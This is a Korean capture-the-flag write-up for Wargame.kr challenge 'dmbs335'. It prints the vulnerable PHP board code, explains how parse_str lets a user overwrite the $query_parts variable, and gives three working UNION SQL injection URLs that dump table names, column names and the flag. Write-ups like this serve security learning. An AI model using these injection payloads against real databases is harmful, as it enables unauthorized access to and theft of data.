# Wargame.kr No.19 - dmbs335

## 문제 출제 의도
php의 parse_str의 취약점을 알고 sql injection 할 수 있는지 확인한다.

## 문제 이해
문제에 접근하기전에 힌트로써 `SQL injection Challenge! (injection)  - thx to dmbs335`기 츨력되었다.

문제에 접근하면 게시판같은 구조와 겁색을 할 수 있는 입력창, 소스코드를 볼 수 있게 해주는 링크가 있었다.

```php
<?php 

if (isset($_GET['view-source'])) {
        show_source(__FILE__);
   .     exit();
}

include("../lib.php");
include("./inc.php"); // Database Connected

function getOperator(&$operator) { 
    switch($operator) { 
        case 'and': 
        case '&&': 
            $operator = 'and'; 
            break; 
        case 'or': 
        case '||': 
            $operator = 'or'; 
            break; 
        default: 
            $operator = 'or'; 
            break; 
}} 

if(preg_match('/session/isUD',$_SERVER['QUERY_STRING'])) {
    exit('not allowed');
}

parse_str($_SERVER['QUERY_STRING']); 
getOperator($operator); 
$keyword = addslashes($keyword);
$where_clause = ''; 

if(!isset($search_cols)) { 
    $search_cols = 'subject|content'; 
} 

$cols = explode('|',$search_cols); 

foreach($cols as $col) { 
    $col = preg_match('/^(subject|content|writer)$/isDU',$col) ? $col : ''; 
    if($col) { 
        $query_parts = $col . " like '%" . $keyword . "%'"; 
    } 

    if($query_parts) { 
        $where_clause .= $query_parts; 
        $where_clause .= ' '; 
        $where_clause .= $operator; 
        $where_clause .= ' '; 
        $query_parts = ''; 
    } 
} 

if(!$where_clause) { 
    $where_clause = "content like '%{$keyword}%'"; 
} 
if(preg_match('/\s'.$operator.'\s$/isDU',$where_clause)) { 
    $len = strlen($where_clause) - (strlen($operator) + 2);
    $where_clause = substr($where_clause, 0, $len); 
} 


?>
<style>
    td:first-child, td:last-child {text-align:center;}
    td {padding:3px; border:1px solid #ddd;}
    thead td {font-weight:bold; text-align:center;}
    tbody tr {cursor:pointer;}
</style>
<br />
<table border=1>
    <thead>
        <tr><td>Num</td><td>subject</td><td>content</td><td>writer</td></tr>
    </thead>
    <tbody>
        <?php
            $result = mysql_query("select * from board where {$where_clause} order by idx desc");
            while ($row = mysql_fetch_assoc($result)) {
                echo "<tr>";
                echo "<td>{$row['idx']}</td>";
                echo "<td>{$row['subject']}</td>";
                echo "<td>{$row['content']}</td>";
                echo "<td>{$row['writer']}</td>";
                echo "</tr>";
            }
        ?>
    </tbody>
    <tfoot>
        <tr><td colspan=4>
            <form method="">
                <select name="search_cols">
                    <option value="subject" selected>subject</option>
                    <option value="content">content</option>
                    <option value="content|content">subject, content</option>
                    <option value="writer">writer</option>
                </select>
                <input type="text" name="keyword" />
                <input type="radio" name="operator" value="or" checked /> or &nbsp;&nbsp;
                <input type="radio" name="operator" value="and" /> and
                <input type="submit" value="SEARCH" />
            </form>
        </td></tr>
    </tfoot>
</table>
<br />
<a href="./?view-source">view-source</a><br />
```
위와 같은 코드로 이루어져있는데 parse_str의 취약점으로 select문의 쿼리를 조작하여 sql injection을 시도할 수 있을 것 같다.

## 문제 해결 방안
이 문제는 simple board와 유사한 문제이다.

우선 parse_str은 파라미터로 받은 문자열을 php 변수로 전환시켜주는 함수이다.

이 함수를 이용하여 쿼리를 그대로 조작하여 select문을 조작할 수 있다.

preg_match함수에서 search_cols 부분에 `write`,`subject`,`writer`이 있다면 다음 코드를 실행하는데 

```php
$query_parts = $col . " like '%" . $keyword . "%'"; 
```
이 코드를 실행 시키지 않고 query_parts를 get방식으로 전달함으로써 아래 코드를 실행시킨다.
```php
    if($query_parts) { 
        $where_clause .= $query_parts; 
        $where_clause .= ' '; 
        $where_clause .= $operator; 
        $where_clause .= ' '; 
        $query_parts = ''; 
    }
```
이 부분에서 $query_parts가 존재할 경우 $query_parts를 $where_clause에 덧붇힌다.

이때부터 simpleboard와 비슷해지는데
`?search_cols=a&keyword=a&operator=or&query_parts=1%20union%20select%20table_schema,table_name,3,4%20FROM%20information_Schema.tables#` 이런식으로 입력해주므로써 위의 search_cols의 preg_match함수를 피해가고 union으로 조작하여 table name 정보를 받아올 수 있었다. 

위를 url에 입력하게 되면 Th1s_1s_Flag_tbl 이라는 테이블이 출력되는데 이제 이 테이블의 컬럼들을 알아보는 쿼리를 만들 수 있었다.

쿼트를 사용하지 않기 위해 헥사코드로 전환하여 
`?search_cols=a&keyword=a&operator=or&query_parts=1%20union%20select%20column_type,column_name,3,4%20FROM%20information_Schema.columns%20where%20table_name=0x546831735F31735F466C61675F74626C`를 입력하자 컬럼 명을 알 수 있었고 f1ag라는 컬럼이 있는 것을 알 수 있었다.

해당 컬럼을 보기 위하여 쿼리를 조작하기 위하여
`?search_cols=a&keyword=a&operator=or&query_parts=1%20union%20select%20f1ag,2,3,4%20FROM%20Th1s_1s_Flag_tbl`를 입력하자 flag가 출력되었고 해당 flag를 auth에 입력하자 문제풀이에 성공하였다.